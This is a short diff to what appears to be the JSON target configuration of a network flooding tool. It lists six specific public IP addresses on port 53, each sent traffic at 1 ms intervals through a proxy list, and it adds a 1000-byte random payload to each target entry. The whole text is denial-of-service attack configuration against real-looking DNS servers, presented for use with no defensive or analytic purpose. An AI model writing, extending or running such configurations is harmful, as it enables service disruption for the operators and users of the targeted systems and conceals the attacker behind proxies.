@@ -6,6 +6,7 @@
       "args": {
         "address": "185.42.137.111:53",
         "interval_ms": 1,
+        "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
@@ -14,6 +15,7 @@
       "args": {
         "address": "91.217.20.1:53",
         "interval_ms": 1,
+        "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
@@ -22,6 +24,7 @@
       "args": {
         "address": "195.93.246.187:53 ",
         "interval_ms": 1,
+        "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
@@ -30,6 +33,7 @@
       "args": {
         "address": "194.58.196.62:53",
         "interval_ms": 1,
+        "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
@@ -38,6 +42,7 @@
       "args": {
         "address": "91.217.21.1:53",
         "interval_ms": 1,
+        "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
@@ -46,6 +51,7 @@
       "args": {
         "address": "195.93.246.212:53",
         "interval_ms": 1,
+        "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     }
